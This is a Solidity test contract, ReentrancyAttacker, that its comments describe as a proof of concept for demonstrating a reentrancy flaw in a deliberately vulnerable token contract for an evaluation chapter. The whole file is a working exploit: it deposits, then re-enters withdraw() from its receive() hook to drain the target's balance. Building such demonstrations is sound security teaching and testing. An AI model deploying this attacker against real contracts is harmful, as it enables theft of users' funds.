// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/// @title ReentrancyAttacker
/// @notice Proof-of-concept attacker used ONLY by the test suite to
///         empirically demonstrate the reentrancy vulnerability in
///         VulnerableRWAToken.sol for the Results & Evaluation chapter.
contract ReentrancyAttacker {
    IVulnerable public immutable target;
    uint256 public attackAmount;

    constructor(address targetAddress) {
        target = IVulnerable(targetAddress);
    }

    function attack() external payable {
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(attackAmount);
    }

    // Re-enters withdraw() while the vulnerable contract is still mid-call,
    // before it has decremented the attacker's recorded balance.
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}
